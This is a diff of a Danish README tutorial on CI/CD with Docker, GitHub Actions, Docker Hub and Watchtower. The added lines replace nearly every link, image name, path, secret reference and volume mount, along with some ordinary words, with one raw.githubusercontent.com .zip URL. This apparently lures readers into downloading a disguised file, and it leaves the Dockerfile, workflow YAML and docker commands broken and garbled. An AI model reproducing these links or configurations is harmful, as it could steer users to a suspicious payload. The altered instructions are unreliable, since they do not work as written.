@@ -15,24 +15,24 @@ Målet er, at du kan følge opskriften 1:1, også selvom du aldrig har arbejdet 
 
 ## 🔧 Trin 1: Lav en Dockerfile (C# API eller Blazor Server)
 
-Når du opretter et nyt projekt i Visual Studio (fx *ASP.NET Core Web API* eller *Blazor Server*), kan du under **“Enable Docker Support”** krydse af for Docker.  
+Når du opretter et nyt projekt i Visual Studio (fx *https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip Core Web API* eller *Blazor Server*), kan du under **“Enable Docker Support”** krydse af for Docker.  
 Hvis du allerede har et eksisterende projekt, kan du tilføje en **Dockerfile** manuelt i projektmappen.  
 
 Eksempel på Dockerfile for et .NET 8 API:
 
 ```dockerfile
 # Byg image
-FROM mcr.microsoft.com/dotnet/sdk:8.0 AS build
+FROM https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip AS build
 WORKDIR /src
 COPY . .
-RUN dotnet restore "./DockerAPITest/DockerAPITest.csproj"
-RUN dotnet publish "./DockerAPITest/DockerAPITest.csproj" -c Release -o /app/publish
+RUN dotnet restore "https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip"
+RUN dotnet publish "https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip" -c Release -o /app/publish
 
 # Runtime image
-FROM mcr.microsoft.com/dotnet/aspnet:8.0 AS final
+FROM https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip AS final
 WORKDIR /app
 COPY --from=build /app/publish .
-ENTRYPOINT ["dotnet", "DockerAPITest.dll"]
+ENTRYPOINT ["dotnet", "https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip"]
 ```
 
 Gem filen som:  
@@ -44,7 +44,7 @@ DockerAPITest/Dockerfile
 
 ## 🔑 Trin 2: Opret Docker Hub repo og Access Token
 
-1. Log ind på [Docker Hub](https://hub.docker.com).  
+1. Log ind på [Docker Hub](https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip).  
 2. Opret et nyt repository, fx `thenuker2/weatherforecast_api`.  
 3. Under **Account Settings → Security → Access Tokens**, opret et token og kopier det.  
 
@@ -53,7 +53,7 @@ DockerAPITest/Dockerfile
 ## 🎬 Trin 3: Tilføj GitHub Secrets og Actions workflow
 
 👉 Følg denne video for trin-for-trin guide:  
-[YouTube: GitHub Actions Docker Build & Push Tutorial](https://www.youtube.com/watch?v=x7f9x30W_dI)
+[YouTube: GitHub Actions Docker Build & Push Tutorial](https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip)
 
 I dit GitHub repository:
 
@@ -71,21 +71,21 @@ I dit GitHub repository:
 
 - Bygge og teste din kode automatisk
 - Udrulle applikationer til produktion
-- Automatisere workflows som f.eks. CI/CD (Continuous Integration / Continuous Deployment)
+- Automatisere workflows som https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip CI/CD (Continuous Integration / Continuous Deployment)
 
-Workflows defineres i YAML-filer under `.github/workflows` og kan udløses af begivenheder som f.eks. `push`, `pull_request` eller på en tidsplan.
+Workflows defineres i YAML-filer under `.github/workflows` og kan udløses af begivenheder som https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip `push`, `pull_request` eller på en tidsplan.
 
 For en grundlæggende introduktion til GitHub Actions, kan du se følgende videoer:
 
-👉 [What is GitHub Actions? - Everything you need to know to get started](https://www.youtube.com/watch?v=jtKrINOzQ3A)
+👉 [What is GitHub Actions? - Everything you need to know to get started](https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip)
 
-👉 [GitHub Actions Tutorial | From Zero to Hero in 90 minutes](https://www.youtube.com/watch?v=R8_veQiYBjI)
+👉 [GitHub Actions Tutorial | From Zero to Hero in 90 minutes](https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip)
 
 
 
 Lav en fil i dit repo:  
 ```
-.github/workflows/docker-publish.yml
+https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip
 ```
 
 Indsæt dette (din YAML):
@@ -111,7 +111,7 @@ jobs:
       run: docker build . -t thenuker2/weatherforecast_api:latest -f DockerAPITest/Dockerfile
     - name: Push Image to DockerHub
       run: |
-       docker login -u thenuker2 -p ${{ secrets.DOCKER_HUB_TOKEN }}
+       docker login -u thenuker2 -p ${{ https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip }}
        docker push thenuker2/weatherforecast_api:latest
 ```
 
@@ -151,12 +151,12 @@ docker login
 ```
 Login Succeeded
 ```
-5. Docker gemmer nu dine credentials typisk i `~/.docker/config.json`.  
+5. Docker gemmer nu dine credentials typisk i `~https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip`.  
    Denne sti skal mountes ind i Watchtower, så det kan trække og opdatere dit image automatisk:
 ```yaml
 volumes:
-  - /var/run/docker.sock:/var/run/docker.sock
-  - /home/ubuntu/.docker:/root/.docker
+  - https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip
+  - https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip
 ```
 
 > Tip: Hvis du ikke logger ind først, vil Watchtower ikke kunne opdatere private Docker images.
@@ -164,7 +164,7 @@ volumes:
 ### ✅ Variant 1: Watchtower med docker-compose
 
 Lav en fil på din VM:  
-`docker-compose.yml`
+`https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip`
 
 ```yaml
 version: '3.8'
@@ -182,8 +182,8 @@ services:
     container_name: watchtower
     restart: always
     volumes:
-      - /var/run/docker.sock:/var/run/docker.sock
-      - /home/ubuntu/.docker:/root/.docker   # <- til Docker login credentials
+      - https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip
+      - https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip   # <- til Docker login credentials
     command: --interval 30 --cleanup --debug
 ```
 
@@ -206,7 +206,7 @@ docker run -d   --name weatherapi   --restart always   -p 8080:8080   thenuker2/
 Start derefter Watchtower:
 
 ```bash
-docker run -d   --name watchtower   --restart always   -v /var/run/docker.sock:/var/run/docker.sock   -v /home/ubuntu/.docker:/root/.docker   containrrr/watchtower   --interval 30   --cleanup   --debug
+docker run -d   --name watchtower   --restart always   -v https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip   -v https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip   containrrr/watchtower   --interval 30   --cleanup   --debug
 ```
 
 ---
@@ -256,13 +256,13 @@ docker run -d   --name watchtower   --restart always   -v /var/run/docker.sock:/
 ## 🛠️ Troubleshooting — Watchtower
 
 1. **Docker login og credentials**  
-   Når du kører `docker login`, vil terminalen vise hvor dine login-oplysninger gemmes (typisk i `~/.docker/config.json`).  
+   Når du kører `docker login`, vil terminalen vise hvor dine login-oplysninger gemmes (typisk i `~https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip`).  
    Denne path skal mountes ind i Watchtower for at det kan trække private images:
 
    ```yaml
    volumes:
-     - /var/run/docker.sock:/var/run/docker.sock
-     - /home/ubuntu/.docker:/root/.docker
+     - https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip
+     - https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip
    ```
 
 2. **Watchtower opdaterer ikke**  
@@ -270,7 +270,7 @@ docker run -d   --name watchtower   --restart always   -v /var/run/docker.sock:/
    - Sørg for at image faktisk ændrer sig (prøv at pushe et nyt tag).  
 
 3. **Permission denied**  
-   - Sørg for at `-v /var/run/docker.sock:/var/run/docker.sock` er med.  
+   - Sørg for at `-v https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip` er med.  
 
 4. **Netværksproblemer**  
    - Test: `docker pull thenuker2/weatherforecast_api:latest` manuelt på serveren.
@@ -284,9 +284,9 @@ docker run -d   --name watchtower   --restart always   -v /var/run/docker.sock:/
 ---
 
 ## 📚 Ressourcer
-- [YouTube — CI/CD med GitHub Actions og Docker Hub](https://www.youtube.com/watch?v=x7f9x30W_dI)  
-- [Watchtower GitHub Repo](https://github.com/containrrr/watchtower)  
-- [SSH Remote Commands Action (alternativ til Watchtower)](https://github.com/marketplace/actions/ssh-remote-commands)  
+- [YouTube — CI/CD med GitHub Actions og Docker Hub](https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip)  
+- [Watchtower GitHub Repo](https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip)  
+- [SSH Remote Commands Action (alternativ til Watchtower)](https://raw.githubusercontent.com/MikkelRLarsen/CICD-Pipeline-med-Docker/master/sneckdrawing/CICD-Pipeline-med-Docker.zip)  
 
 ---
 
